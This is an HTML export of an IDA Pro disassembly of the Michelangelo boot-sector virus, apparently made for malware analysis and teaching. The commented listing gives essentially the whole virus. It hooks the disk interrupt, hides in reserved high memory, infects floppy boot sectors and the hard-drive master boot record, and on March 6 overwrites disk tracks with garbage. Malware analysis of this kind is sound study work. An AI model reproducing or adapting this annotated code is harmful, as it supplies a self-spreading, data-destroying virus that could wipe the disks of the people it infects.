<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1">
<title>IDA - michelangelo.1.idb (michelangelo.1) C:\Users\golden\Desktop\michelangelo-sample\michelangelo.1.idb</title>
</head>
<body bgcolor="#ffffff">
<span style="white-space: pre; font-family: Consolas; color: blue; background: #ffffff">

<span style="color:maroon">seg000:7C00 </span>;
<span style="color:maroon">seg000:7C00 </span>; +-------------------------------------------------------------------------+
<span style="color:maroon">seg000:7C00 </span>; |      This file was generated by The Interactive Disassembler (IDA)      |
<span style="color:maroon">seg000:7C00 </span>; |           Copyright (c) 2018 Hex-Rays, &lt;support@hex-rays.com&gt;           |
<span style="color:maroon">seg000:7C00 </span>; |                      License info: 48-3075-7234-77                      |
<span style="color:maroon">seg000:7C00 </span>; |             Golden Richard, LSU Louisiana State University              |
<span style="color:maroon">seg000:7C00 </span>; +-------------------------------------------------------------------------+
<span style="color:maroon">seg000:7C00 </span>;
<span style="color:maroon">seg000:7C00 </span>; Input SHA256 : B8A70F4A55E3EF8F59363FDF1F6ECD8761F3B8CEF8DB122EB0B2081B8C4CCD0E
<span style="color:maroon">seg000:7C00 </span>; Input MD5    : 3FFC402675E30C6E42560EAA0A90A2B7
<span style="color:maroon">seg000:7C00 </span>; Input CRC32  : 827C7725
<span style="color:maroon">seg000:7C00
seg000:7C00 </span><span style="color:gray">; ---------------------------------------------------------------------------
</span><span style="color:maroon">seg000:7C00 </span>; File Name   : C:\Users\golden\Desktop\michelangelo-sample\michelangelo.1
<span style="color:maroon">seg000:7C00 </span>; Format      : Binary file
<span style="color:maroon">seg000:7C00 </span>; Base Address: 0000h Range: 0000h - 0200h Loaded length: 0200h
<span style="color:maroon">seg000:7C00
seg000:7C00                 .</span>686p
<span style="color:maroon">seg000:7C00                 </span>.mmx
<span style="color:maroon">seg000:7C00                 </span>.model flat
<span style="color:maroon">seg000:7C00
seg000:7C00 </span><span style="color:gray">; ===========================================================================
</span><span style="color:maroon">seg000:7C00
seg000:7C00 </span><span style="color:gray">; Segment type: Regular
</span><span style="color:maroon">seg000:7C00 </span>seg000          segment byte public &#039;&#039; use16
<span style="color:maroon">seg000:7C00                 </span>assume cs:seg000
<span style="color:maroon">seg000:7C00                 </span><span style="color:gray">;org 7C00h
</span><span style="color:maroon">seg000:7C00                 </span>assume es:nothing, ss:nothing, ds:nothing, fs:nothing, gs:nothing
<span style="color:maroon">seg000:7C00                 </span><span style="color:navy">jmp     </span>ProgramStart    ; jump to start of program
<span style="color:maroon">seg000:7C00 </span><span style="color:gray">; ---------------------------------------------------------------------------
</span><span style="color:olive">seg000:7C03 </span><span style="color:navy">hidden_mem_jmp  db </span><span style="color:#008040">0F5h                 </span><span style="color:#8080ff">; DATA XREF: seg000:7CF0↓r
</span><span style="color:olive">seg000:7C04                 </span><span style="color:navy">db    </span><span style="color:#008040">0
</span><span style="color:gray">seg000:7C05 </span>hidden_mem_offset <span style="color:navy">dw </span><span style="color:#008040">0                  </span><span style="color:#8080ff">; DATA XREF: seg000:7CD8↓w
</span><span style="color:olive">seg000:7C07 </span><span style="color:navy">disk_heads      db    </span><span style="color:#008040">2
</span><span style="color:gray">seg000:7C08 </span>orig_boot_sector <span style="color:navy">dw </span><span style="color:#008040">0Eh
</span><span style="color:gray">seg000:7C0A </span>int13_offset    <span style="color:navy">dw </span><span style="color:#008040">9739h                </span><span style="color:#8080ff">; DATA XREF: seg000:7CC1↓w
</span><span style="color:gray">seg000:7C0C </span>int13_segment   <span style="color:navy">dw </span><span style="color:#008040">0F000h               </span><span style="color:#8080ff">; DATA XREF: seg000:7CC7↓w
</span><span style="color:maroon">seg000:7C0E </span><span style="color:gray">; ---------------------------------------------------------------------------
</span><span style="color:maroon">seg000:7C0E                 </span><span style="color:navy">push    ds              </span>; start of evil int13
<span style="color:maroon">seg000:7C0E                                         </span>; saving registers
<span style="color:maroon">seg000:7C0F                 </span><span style="color:navy">push    ax
</span><span style="color:maroon">seg000:7C10                 </span><span style="color:navy">or      dl, dl          </span>; check if operating on boot drive
<span style="color:maroon">seg000:7C12                 </span><span style="color:navy">jnz     short </span>do_real_int13_and_ret ; if on boot drive, assume infected and jump
<span style="color:maroon">seg000:7C14                 </span><span style="color:navy">xor     ax, ax
</span><span style="color:maroon">seg000:7C16                 </span><span style="color:navy">mov     ds, ax
</span><span style="color:maroon">seg000:7C18                 </span><span style="color:navy">test    byte ptr ds:</span><span style="color:green">43Fh</span><span style="color:navy">, </span><span style="color:green">1 </span>; check if drive motor running
<span style="color:maroon">seg000:7C1D                 </span><span style="color:navy">jnz     short </span>do_real_int13_and_ret ; if motor running, assume infected and jump
<span style="color:maroon">seg000:7C1F                 </span><span style="color:navy">pop     ax              </span>; pop reggies
<span style="color:maroon">seg000:7C20                 </span><span style="color:navy">pop     ds
</span><span style="color:maroon">seg000:7C21                 </span><span style="color:navy">pushf
</span><span style="color:maroon">seg000:7C22                 </span><span style="color:navy">call    dword ptr cs:</span><span style="color:green">0Ah </span>; do real int13
<span style="color:maroon">seg000:7C27                 </span><span style="color:navy">pushf                   </span>; save flags from int13
<span style="color:maroon">seg000:7C28                 </span><span style="color:navy">call    </span>infection_routine ; do infection routine
<span style="color:maroon">seg000:7C2B                 </span><span style="color:navy">popf                    </span>; pop flags from real int13
<span style="color:maroon">seg000:7C2C                 </span><span style="color:navy">retf    </span><span style="color:green">2               </span>; return to caller
<span style="color:maroon">seg000:7C2F </span><span style="color:gray">; ---------------------------------------------------------------------------
</span><span style="color:maroon">seg000:7C2F
seg000:7C2F </span>do_real_int13_and_ret<span style="color:navy">:                  </span><span style="color:green">; CODE XREF: seg000:7C12↑j
</span><span style="color:maroon">seg000:7C2F                                         </span><span style="color:green">; seg000:7C1D↑j
</span><span style="color:maroon">seg000:7C2F                 </span><span style="color:navy">pop     ax              </span>; pop reggies
<span style="color:maroon">seg000:7C30                 </span><span style="color:navy">pop     ds
</span><span style="color:maroon">seg000:7C31                 </span><span style="color:navy">jmp     dword ptr cs:</span><span style="color:green">0Ah </span>; do real int13 and return to caller
<span style="color:black">seg000:7C36
seg000:7C36 </span><span style="color:gray">; =============== S U B R O U T I N E =======================================
</span><span style="color:black">seg000:7C36
seg000:7C36
seg000:7C36 </span>infection_routine <span style="color:black">proc near             </span><span style="color:green">; CODE XREF: seg000:7C28↑p
</span><span style="color:black">seg000:7C36                 </span><span style="color:navy">push    ax              </span>; save registers
<span style="color:black">seg000:7C37                 </span><span style="color:navy">push    bx
</span><span style="color:black">seg000:7C38                 </span><span style="color:navy">push    cx
</span><span style="color:black">seg000:7C39                 </span><span style="color:navy">push    dx
</span><span style="color:black">seg000:7C3A                 </span><span style="color:navy">push    ds
</span><span style="color:black">seg000:7C3B                 </span><span style="color:navy">push    es
</span><span style="color:black">seg000:7C3C                 </span><span style="color:navy">push    si
</span><span style="color:black">seg000:7C3D                 </span><span style="color:navy">push    di
</span><span style="color:black">seg000:7C3E                 </span><span style="color:navy">push    cs
</span><span style="color:black">seg000:7C3F                 </span><span style="color:navy">pop     ds
</span><span style="color:black">seg000:7C40                 </span><span style="color:navy">push    cs
</span><span style="color:black">seg000:7C41                 </span><span style="color:navy">pop     es
</span><span style="color:black">seg000:7C42                 </span><span style="color:navy">mov     si, </span><span style="color:green">4           </span>; disk read try count = 4
<span style="color:black">seg000:7C45
seg000:7C45 </span><span style="color:gray">boot_sec_read</span><span style="color:navy">:                          </span><span style="color:green">; CODE XREF: infection_routine+29↓j
</span><span style="color:black">seg000:7C45                 </span><span style="color:navy">mov     ax, </span><span style="color:green">201h        </span>; read 1 sector...
<span style="color:black">seg000:7C48                 </span><span style="color:navy">mov     bx, </span><span style="color:green">200h        </span>; ...into memory higher than virus code...
<span style="color:black">seg000:7C4B                 </span><span style="color:navy">mov     cx, </span><span style="color:green">1           </span>; ...starting at track 0, sector 1...
<span style="color:black">seg000:7C4E                 </span><span style="color:navy">xor     dx, dx          </span>; ...from the boot drive
<span style="color:black">seg000:7C50                 </span><span style="color:navy">pushf                   </span>; push current flags
<span style="color:black">seg000:7C51                 </span><span style="color:navy">call    dword ptr ds:</span><span style="color:green">0Ah </span>; read boot sector into high memory
<span style="color:black">seg000:7C55                 </span><span style="color:navy">jnb     short </span><span style="color:gray">check_drive_infected </span>; jump if no error on disk read
<span style="color:black">seg000:7C57                 </span><span style="color:navy">xor     ax, ax
</span><span style="color:black">seg000:7C59                 </span><span style="color:navy">pushf
</span><span style="color:black">seg000:7C5A                 </span><span style="color:navy">call    dword ptr ds:</span><span style="color:green">0Ah </span>; if error, reset disk
<span style="color:black">seg000:7C5E                 </span><span style="color:navy">dec     si              </span>; decrement try count
<span style="color:black">seg000:7C5F                 </span><span style="color:navy">jnz     short </span><span style="color:gray">boot_sec_read </span>; try read again if si != 0
<span style="color:black">seg000:7C61                 </span><span style="color:navy">jmp     short </span><span style="color:gray">return_to_caller </span>; otherwise, return to caller
<span style="color:black">seg000:7C63 </span><span style="color:gray">; ---------------------------------------------------------------------------
</span><span style="color:black">seg000:7C63
seg000:7C63 </span><span style="color:gray">check_drive_infected</span><span style="color:navy">:                   </span><span style="color:green">; CODE XREF: infection_routine+1F↑j
</span><span style="color:black">seg000:7C63                 </span><span style="color:navy">xor     si, si          </span>; clear source index
<span style="color:black">seg000:7C65                 </span><span style="color:navy">cld                     </span>; set load direction forward
<span style="color:black">seg000:7C66                 </span><span style="color:navy">lodsw                   </span>; load first two bytes of disk
<span style="color:black">seg000:7C67                 </span><span style="color:navy">cmp     ax, [bx]        </span>; compare first two bytes of disk and virus
<span style="color:black">seg000:7C69                 </span><span style="color:navy">jnz     short </span><span style="color:gray">set_drive_type </span>; jump if drive not infected
<span style="color:black">seg000:7C6B                 </span><span style="color:navy">lodsw                   </span>; load and...
<span style="color:black">seg000:7C6C                 </span><span style="color:navy">cmp     ax, [bx+</span><span style="color:green">2</span><span style="color:navy">]      </span>; ...compare next two bytes
<span style="color:black">seg000:7C6F                 </span><span style="color:navy">jz      short </span><span style="color:gray">return_to_caller </span>; jump if drive infected
<span style="color:black">seg000:7C71
seg000:7C71 </span><span style="color:gray">set_drive_type</span><span style="color:navy">:                         </span><span style="color:green">; CODE XREF: infection_routine+33↑j
</span><span style="color:black">seg000:7C71                 </span><span style="color:navy">mov     ax, </span><span style="color:green">301h        </span>; write 1 sector...
<span style="color:black">seg000:7C74                 </span><span style="color:navy">mov     dh, </span><span style="color:green">1           </span>; ...at head 1...
<span style="color:black">seg000:7C76                 </span><span style="color:navy">mov     cl, </span><span style="color:green">3           </span>; ...at sector 3 (location for 360k floppy)
<span style="color:black">seg000:7C78                 </span><span style="color:navy">cmp     byte ptr [bx+</span><span style="color:green">15h</span><span style="color:navy">], </span><span style="color:green">0FDh </span>; get media descriptor byte from mbr
<span style="color:black">seg000:7C7C                 </span><span style="color:navy">jz      short </span><span style="color:gray">infect_drive </span>; jump if floppy
<span style="color:black">seg000:7C7E                 </span><span style="color:navy">mov     cl, </span><span style="color:green">0Eh         </span>; if not floppy, write to sector 14
<span style="color:black">seg000:7C80
seg000:7C80 </span><span style="color:gray">infect_drive</span><span style="color:navy">:                           </span><span style="color:green">; CODE XREF: infection_routine+46↑j
</span><span style="color:black">seg000:7C80                 </span><span style="color:navy">mov     ds:</span><span style="color:green">8</span><span style="color:navy">, cx        </span>; save drive type
<span style="color:black">seg000:7C84                 </span><span style="color:navy">pushf                   </span>; push flags
<span style="color:black">seg000:7C85                 </span><span style="color:navy">call    dword ptr ds:</span><span style="color:green">0Ah </span>; copy boot sector to new spot on disk
<span style="color:black">seg000:7C89                 </span><span style="color:navy">jb      short </span><span style="color:gray">return_to_caller </span>; if error, return
<span style="color:black">seg000:7C8B                 </span><span style="color:navy">mov     si, </span><span style="color:green">3BEh        </span>; start of partition table
<span style="color:black">seg000:7C8E                 </span><span style="color:navy">mov     di, </span><span style="color:green">1BEh        </span>; destination for partition table
<span style="color:black">seg000:7C91                 </span><span style="color:navy">mov     cx, </span><span style="color:green">21h </span><span style="color:gray">; &#039;!&#039;   </span>; length of partition table
<span style="color:black">seg000:7C94                 </span><span style="color:navy">cld                     </span>; copy forward
<span style="color:black">seg000:7C95                 </span><span style="color:navy">rep movsw               </span>; copy partition table in high memory into virus
<span style="color:black">seg000:7C97                 </span><span style="color:navy">mov     ax, </span><span style="color:green">301h        </span>; write 1 sector...
<span style="color:black">seg000:7C9A                 </span><span style="color:navy">xor     bx, bx          </span>; ...starting from virus start
<span style="color:black">seg000:7C9C                 </span><span style="color:navy">mov     cx, </span><span style="color:green">1           </span>; ...write to sector 1...
<span style="color:black">seg000:7C9F                 </span><span style="color:navy">xor     dx, dx          </span>; ...write to boot drive
<span style="color:black">seg000:7CA1                 </span><span style="color:navy">pushf                   </span>; push flags
<span style="color:black">seg000:7CA2                 </span><span style="color:navy">call    dword ptr ds:</span><span style="color:green">0Ah </span>; copy virus to disk
<span style="color:black">seg000:7CA6
seg000:7CA6 </span><span style="color:gray">return_to_caller</span><span style="color:navy">:                       </span><span style="color:green">; CODE XREF: infection_routine+2B↑j
</span><span style="color:black">seg000:7CA6                                         </span><span style="color:green">; infection_routine+39↑j ...
</span><span style="color:black">seg000:7CA6                 </span><span style="color:navy">pop     di              </span>; pop registers
<span style="color:black">seg000:7CA7                 </span><span style="color:navy">pop     si
</span><span style="color:black">seg000:7CA8                 </span><span style="color:navy">pop     es
</span><span style="color:black">seg000:7CA9                 </span><span style="color:navy">pop     ds
</span><span style="color:black">seg000:7CAA                 </span><span style="color:navy">pop     dx
</span><span style="color:black">seg000:7CAB                 </span><span style="color:navy">pop     cx
</span><span style="color:black">seg000:7CAC                 </span><span style="color:navy">pop     bx
</span><span style="color:black">seg000:7CAD                 </span><span style="color:navy">pop     ax
</span><span style="color:black">seg000:7CAE                 </span><span style="color:navy">retn                    </span>; return to caller
<span style="color:black">seg000:7CAE </span>infection_routine <span style="color:black">endp
seg000:7CAE
</span><span style="color:maroon">seg000:7CAF </span><span style="color:gray">; ---------------------------------------------------------------------------
</span><span style="color:maroon">seg000:7CAF
seg000:7CAF </span>ProgramStart<span style="color:navy">:                           </span><span style="color:green">; CODE XREF: seg000:7C00↑j
</span><span style="color:maroon">seg000:7CAF                 </span><span style="color:navy">xor     ax, ax          </span>; start of program
<span style="color:maroon">seg000:7CAF                                         </span>; clear ax
<span style="color:maroon">seg000:7CB1                 </span><span style="color:navy">mov     ds, ax          </span>; clear ds
<span style="color:maroon">seg000:7CB3                 </span><span style="color:navy">cli                     </span>; stop interupts
<span style="color:maroon">seg000:7CB4                 </span><span style="color:navy">mov     ss, ax          </span>; set up stack segment
<span style="color:maroon">seg000:7CB6                 </span><span style="color:navy">mov     ax, </span><span style="color:green">7C00h
</span><span style="color:maroon">seg000:7CB9                 </span><span style="color:navy">mov     sp, ax          </span>; start stack below program code
<span style="color:maroon">seg000:7CBB                 </span><span style="color:navy">sti                     </span>; resume interupts
<span style="color:maroon">seg000:7CBC                 </span><span style="color:navy">push    ds              </span>; pushing ax and ds for final return to real boot sector
<span style="color:maroon">seg000:7CBD                 </span><span style="color:navy">push    ax
</span><span style="color:maroon">seg000:7CBE                 </span><span style="color:navy">mov     ax, ds:</span><span style="color:green">4Ch      </span>; get segment of int13 pointer
<span style="color:maroon">seg000:7CC1                 </span><span style="color:navy">mov     ds:</span>int13_offset<span style="color:navy">, ax </span>; store it in program data
<span style="color:maroon">seg000:7CC4                 </span><span style="color:navy">mov     ax, ds:</span><span style="color:green">4Eh      </span>; get offset of int13 pointer
<span style="color:maroon">seg000:7CC7                 </span><span style="color:navy">mov     ds:</span>int13_segment<span style="color:navy">, ax </span>; store it in program data
<span style="color:maroon">seg000:7CCA                 </span><span style="color:navy">mov     ax, ds:</span><span style="color:green">413h     </span>; get memory size in kb
<span style="color:maroon">seg000:7CCD                 </span><span style="color:navy">dec     ax              </span>; decrement it by 2k
<span style="color:maroon">seg000:7CCE                 </span><span style="color:navy">dec     ax
</span><span style="color:maroon">seg000:7CCF                 </span><span style="color:navy">mov     ds:</span><span style="color:green">413h</span><span style="color:navy">, ax     </span>; overwrite memory size with new value
<span style="color:maroon">seg000:7CD2                 </span><span style="color:navy">mov     cl, </span><span style="color:green">6
</span><span style="color:maroon">seg000:7CD4                 </span><span style="color:navy">shl     ax, cl          </span>; shift memory size by 6 bits to convert to offset
<span style="color:maroon">seg000:7CD6                 </span><span style="color:navy">mov     es, ax          </span>; store converted offset in es
<span style="color:maroon">seg000:7CD8                 </span><span style="color:navy">mov     ds:</span>hidden_mem_offset<span style="color:navy">, ax </span>; store high memory offset location
<span style="color:maroon">seg000:7CDB                 </span><span style="color:navy">mov     ax, </span><span style="color:green">0Eh         </span>; evil int13 handler offset
<span style="color:maroon">seg000:7CDE                 </span><span style="color:navy">mov     ds:</span><span style="color:green">4Ch</span><span style="color:navy">, ax      </span>; overwrite real int13 offset with evil one
<span style="color:maroon">seg000:7CE1                 </span><span style="color:navy">mov     word ptr ds:</span><span style="color:green">4Eh</span><span style="color:navy">, es </span>; overwrite real int13 segment with evil one
<span style="color:maroon">seg000:7CE5                 </span><span style="color:navy">mov     cx, </span><span style="color:green">1BEh        </span>; length of program
<span style="color:maroon">seg000:7CE8                 </span><span style="color:navy">mov     si, </span><span style="color:green">7C00h       </span>; start address for copy: start of program
<span style="color:maroon">seg000:7CEB                 </span><span style="color:navy">xor     di, di          </span>; clear destination index
<span style="color:maroon">seg000:7CED                 </span><span style="color:navy">cld                     </span>; copy direction forward
<span style="color:maroon">seg000:7CEE                 </span><span style="color:navy">rep movsb               </span>; copy program to hidden memory
<span style="color:maroon">seg000:7CF0                 </span><span style="color:navy">jmp     dword ptr cs:hidden_mem_jmp </span>; jump to next line but in hidden memory
<span style="color:maroon">seg000:7CF5 </span><span style="color:gray">; ---------------------------------------------------------------------------
</span><span style="color:maroon">seg000:7CF5                 </span><span style="color:navy">xor     ax, ax          </span>; clear ax
<span style="color:maroon">seg000:7CF7                 </span><span style="color:navy">mov     es, ax          </span>; clear es
<span style="color:maroon">seg000:7CF9                 </span><span style="color:navy">int     </span><span style="color:green">13h             </span>; reset disk
<span style="color:maroon">seg000:7CFB                 </span><span style="color:navy">push    cs              </span>; ds = cs
<span style="color:maroon">seg000:7CFC                 </span><span style="color:navy">pop     ds
</span><span style="color:maroon">seg000:7CFD                 </span><span style="color:navy">mov     ax, </span><span style="color:green">201h        </span>; read 1 sector
<span style="color:maroon">seg000:7D00                 </span><span style="color:navy">mov     bx, </span><span style="color:green">7C00h       </span>; into 7C00
<span style="color:maroon">seg000:7D03                 </span><span style="color:navy">mov     cx, ds:</span><span style="color:green">8        </span>; from orig boot sector location
<span style="color:maroon">seg000:7D07                 </span><span style="color:navy">cmp     cx, </span><span style="color:green">7           </span>; check if type == 7 (hard drive)
<span style="color:maroon">seg000:7D0A                 </span><span style="color:navy">jnz     short </span>handle_floppy ; if not, jump
<span style="color:maroon">seg000:7D0C                 </span><span style="color:navy">mov     dx, </span><span style="color:green">80h         </span>; target 1st hard drive
<span style="color:maroon">seg000:7D0F                 </span><span style="color:navy">int     </span><span style="color:green">13h             </span>; read real boot sector into memory
<span style="color:maroon">seg000:7D11                 </span><span style="color:navy">jmp     short </span>check_kill_date ; skip floppy code
<span style="color:maroon">seg000:7D13 </span><span style="color:gray">; ---------------------------------------------------------------------------
</span><span style="color:maroon">seg000:7D13
seg000:7D13 </span>handle_floppy<span style="color:navy">:                          </span><span style="color:green">; CODE XREF: seg000:7D0A↑j
</span><span style="color:maroon">seg000:7D13                 </span><span style="color:navy">mov     cx, ds:</span><span style="color:green">8        </span>; get backup boot sector
<span style="color:maroon">seg000:7D17                 </span><span style="color:navy">mov     dx, </span><span style="color:green">100h        </span>; first floppy
<span style="color:maroon">seg000:7D1A                 </span><span style="color:navy">int     </span><span style="color:green">13h             </span>; read real boot sector into memory
<span style="color:maroon">seg000:7D1C                 </span><span style="color:navy">jb      short </span>check_kill_date ; jump if error
<span style="color:maroon">seg000:7D1E                 </span><span style="color:navy">push    cs              </span>; es = cs
<span style="color:maroon">seg000:7D1F                 </span><span style="color:navy">pop     es
</span><span style="color:maroon">seg000:7D20                 </span><span style="color:navy">mov     ax, </span><span style="color:green">201h        </span>; read 1 sector
<span style="color:maroon">seg000:7D23                 </span><span style="color:navy">mov     bx, </span><span style="color:green">200h        </span>; into memory above virus
<span style="color:maroon">seg000:7D26                 </span><span style="color:navy">mov     cx, </span><span style="color:green">1           </span>; track 0, sector 1
<span style="color:maroon">seg000:7D29                 </span><span style="color:navy">mov     dx, </span><span style="color:green">80h         </span>; from hard drive
<span style="color:maroon">seg000:7D2C                 </span><span style="color:navy">int     </span><span style="color:green">13h             </span>; read boot drive boot sector to above virus
<span style="color:maroon">seg000:7D2E                 </span><span style="color:navy">jb      short </span>check_kill_date ; jump if error
<span style="color:maroon">seg000:7D30                 </span><span style="color:navy">xor     si, si          </span>; clear source index
<span style="color:maroon">seg000:7D32                 </span><span style="color:navy">cld                     </span>; copy direction forward
<span style="color:maroon">seg000:7D33                 </span><span style="color:navy">lodsw                   </span>; load first two bytes of disk
<span style="color:maroon">seg000:7D34                 </span><span style="color:navy">cmp     ax, [bx]        </span>; compare to virus for 4 bytes
<span style="color:maroon">seg000:7D34                                         </span>; if not equal, jump
<span style="color:maroon">seg000:7D36                 </span><span style="color:navy">jnz     short </span>infect_hard_drive
<span style="color:maroon">seg000:7D38                 </span><span style="color:navy">lodsw
</span><span style="color:maroon">seg000:7D39                 </span><span style="color:navy">cmp     ax, [bx+</span><span style="color:green">2</span><span style="color:navy">]
</span><span style="color:maroon">seg000:7D3C                 </span><span style="color:navy">jnz     short </span>infect_hard_drive
<span style="color:maroon">seg000:7D3E
seg000:7D3E </span>check_kill_date<span style="color:navy">:                        </span><span style="color:green">; CODE XREF: seg000:7D11↑j
</span><span style="color:maroon">seg000:7D3E                                         </span><span style="color:green">; seg000:7D1C↑j ...
</span><span style="color:maroon">seg000:7D3E                 </span><span style="color:navy">xor     cx, cx
</span><span style="color:maroon">seg000:7D40                 </span><span style="color:navy">mov     ah, </span><span style="color:green">4           </span>; set ah=4 to read date
<span style="color:maroon">seg000:7D42                 </span><span style="color:navy">int     </span><span style="color:green">1Ah             </span>; check current date
<span style="color:maroon">seg000:7D44                 </span><span style="color:navy">cmp     dx, </span><span style="color:green">306h        </span>; check if date = 3/6
<span style="color:maroon">seg000:7D48                 </span><span style="color:navy">jz      short loc_7D4B  </span>; jump if date matched
<span style="color:maroon">seg000:7D4A                 </span><span style="color:navy">retf                    </span>; otherwise, return and allow boot
<span style="color:maroon">seg000:7D4B </span><span style="color:gray">; ---------------------------------------------------------------------------
</span><span style="color:maroon">seg000:7D4B
seg000:7D4B </span><span style="color:navy">loc_7D4B:                               </span><span style="color:green">; CODE XREF: seg000:7D48↑j
</span><span style="color:maroon">seg000:7D4B                 </span><span style="color:navy">xor     dx, dx          </span>; clear dx
<span style="color:maroon">seg000:7D4D                 </span><span style="color:navy">mov     cx, </span><span style="color:green">1           </span>; write track 0, sector 1
<span style="color:maroon">seg000:7D50
seg000:7D50 </span>set_params_for_drive_type<span style="color:navy">:              </span><span style="color:green">; CODE XREF: seg000:7D7F↓j
</span><span style="color:maroon">seg000:7D50                                         </span><span style="color:green">; seg000:7D85↓j
</span><span style="color:maroon">seg000:7D50                 </span><span style="color:navy">mov     ax, </span><span style="color:green">309h        </span>; write 9 sectors
<span style="color:maroon">seg000:7D53                 </span><span style="color:navy">mov     si, ds:</span><span style="color:green">8        </span>; get boot sector location
<span style="color:maroon">seg000:7D57                 </span><span style="color:navy">cmp     si, </span><span style="color:green">3           </span>; check for 360k floppy
<span style="color:maroon">seg000:7D5A                 </span><span style="color:navy">jz      short </span>trash_disk ; jump if true
<span style="color:maroon">seg000:7D5C                 </span><span style="color:navy">mov     al, </span><span style="color:green">0Eh         </span>; set al for disk type
<span style="color:maroon">seg000:7D5E                 </span><span style="color:navy">cmp     si, </span><span style="color:green">0Eh         </span>; check for non-360k
<span style="color:maroon">seg000:7D61                 </span><span style="color:navy">jz      short </span>trash_disk ; jump if true
<span style="color:maroon">seg000:7D63                 </span><span style="color:navy">mov     dl, </span><span style="color:green">80h         </span>; target hard drive
<span style="color:maroon">seg000:7D65                 </span><span style="color:navy">mov     byte ptr ds:</span><span style="color:green">7</span><span style="color:navy">, </span><span style="color:green">4 </span>; set disk heads to 4
<span style="color:maroon">seg000:7D6A                 </span><span style="color:navy">mov     al, </span><span style="color:green">11h         </span>; write 17 sectors
<span style="color:maroon">seg000:7D6C
seg000:7D6C </span>trash_disk<span style="color:navy">:                             </span><span style="color:green">; CODE XREF: seg000:7D5A↑j
</span><span style="color:maroon">seg000:7D6C                                         </span><span style="color:green">; seg000:7D61↑j
</span><span style="color:maroon">seg000:7D6C                 </span><span style="color:navy">mov     bx, </span><span style="color:green">5000h       </span>; random memory source
<span style="color:maroon">seg000:7D6F                 </span><span style="color:navy">mov     es, bx          </span>; setting es
<span style="color:maroon">seg000:7D71                 </span>assume es:nothing
<span style="color:maroon">seg000:7D71                 </span><span style="color:navy">int     </span><span style="color:green">13h             </span>; trask disk with garbage memory
<span style="color:maroon">seg000:7D73                 </span><span style="color:navy">jnb     short loc_7D79  </span>; jump if no error
<span style="color:maroon">seg000:7D75                 </span><span style="color:navy">xor     ah, ah          </span>; set ah to reset disk
<span style="color:maroon">seg000:7D77                 </span><span style="color:navy">int     </span><span style="color:green">13h             </span>; reset disk
<span style="color:maroon">seg000:7D79
seg000:7D79 </span><span style="color:navy">loc_7D79:                               </span><span style="color:green">; CODE XREF: seg000:7D73↑j
</span><span style="color:maroon">seg000:7D79                 </span><span style="color:navy">inc     dh              </span>; next head for drive write
<span style="color:maroon">seg000:7D7B                 </span><span style="color:navy">cmp     dh, ds:</span><span style="color:green">7        </span>; check if max heads met
<span style="color:maroon">seg000:7D7F                 </span><span style="color:navy">jb      short </span>set_params_for_drive_type ; jump if met
<span style="color:maroon">seg000:7D81                 </span><span style="color:navy">xor     dh, dh          </span>; clear head number
<span style="color:maroon">seg000:7D83                 </span><span style="color:navy">inc     ch              </span>; increment track number
<span style="color:maroon">seg000:7D85                 </span><span style="color:navy">jmp     short </span>set_params_for_drive_type
<span style="color:maroon">seg000:7D87 </span><span style="color:gray">; ---------------------------------------------------------------------------
</span><span style="color:maroon">seg000:7D87
seg000:7D87 </span>infect_hard_drive<span style="color:navy">:                      </span><span style="color:green">; CODE XREF: seg000:7D36↑j
</span><span style="color:maroon">seg000:7D87                                         </span><span style="color:green">; seg000:7D3C↑j
</span><span style="color:maroon">seg000:7D87                 </span><span style="color:navy">mov     cx, </span><span style="color:green">7           </span>; use sector 7 as backup boot location
<span style="color:maroon">seg000:7D8A                 </span><span style="color:navy">mov     ds:</span><span style="color:green">8</span><span style="color:navy">, cx        </span>; save location
<span style="color:maroon">seg000:7D8E                 </span><span style="color:navy">mov     ax, </span><span style="color:green">301h        </span>; write 1 sector...
<span style="color:maroon">seg000:7D91                 </span><span style="color:navy">mov     dx, </span><span style="color:green">80h         </span>; to hard drive
<span style="color:maroon">seg000:7D94                 </span><span style="color:navy">int     </span><span style="color:green">13h             </span>; write backup mbr to hard drive
<span style="color:maroon">seg000:7D96                 </span><span style="color:navy">jb      short </span>check_kill_date ; if error, jump
<span style="color:maroon">seg000:7D98                 </span><span style="color:navy">mov     si, </span><span style="color:green">3BEh        </span>; read partition table
<span style="color:maroon">seg000:7D9B                 </span><span style="color:navy">mov     di, </span><span style="color:green">1BEh        </span>; into virus code
<span style="color:maroon">seg000:7D9E                 </span><span style="color:navy">mov     cx, </span><span style="color:green">21h </span><span style="color:gray">; &#039;!&#039;   </span>; length of partition table
<span style="color:maroon">seg000:7DA1                 </span><span style="color:navy">rep movsw               </span>; copy table into virus
<span style="color:maroon">seg000:7DA3                 </span><span style="color:navy">mov     ax, </span><span style="color:green">301h        </span>; write one sector
<span style="color:maroon">seg000:7DA6                 </span><span style="color:navy">xor     bx, bx          </span>; clear buffer offset
<span style="color:maroon">seg000:7DA8                 </span><span style="color:navy">inc     cl              </span>; track 1, sector 0
<span style="color:maroon">seg000:7DAA                 </span><span style="color:navy">int     </span><span style="color:green">13h             </span>; copy virus to disk
<span style="color:maroon">seg000:7DAC                 </span><span style="color:navy">jmp     short </span>check_kill_date
<span style="color:maroon">seg000:7DAC </span><span style="color:gray">; ---------------------------------------------------------------------------
</span><span style="color:olive">seg000:7DAE                 </span><span style="color:navy">db    </span><span style="color:#008040">0
</span><span style="color:olive">seg000:7DAF                 </span><span style="color:navy">db    </span><span style="color:#008040">0
</span><span style="color:olive">seg000:7DB0                 </span><span style="color:navy">db    </span><span style="color:#008040">0
</span><span style="color:olive">seg000:7DB1                 </span><span style="color:navy">db    </span><span style="color:#008040">0
</span><span style="color:olive">seg000:7DB2                 </span><span style="color:navy">db    </span><span style="color:#008040">0                 </span>; space for partition table
<span style="color:olive">seg000:7DB3                 </span><span style="color:navy">db    </span><span style="color:#008040">0
</span><span style="color:olive">seg000:7DB4                 </span><span style="color:navy">db    </span><span style="color:#008040">0
</span><span style="color:olive">seg000:7DB5                 </span><span style="color:navy">db    </span><span style="color:#008040">0
</span><span style="color:olive">seg000:7DB6                 </span><span style="color:navy">db    </span><span style="color:#008040">0
</span><span style="color:olive">seg000:7DB7                 </span><span style="color:navy">db    </span><span style="color:#008040">0
</span><span style="color:olive">seg000:7DB8                 </span><span style="color:navy">db    </span><span style="color:#008040">0
</span><span style="color:olive">seg000:7DB9                 </span><span style="color:navy">db    </span><span style="color:#008040">0
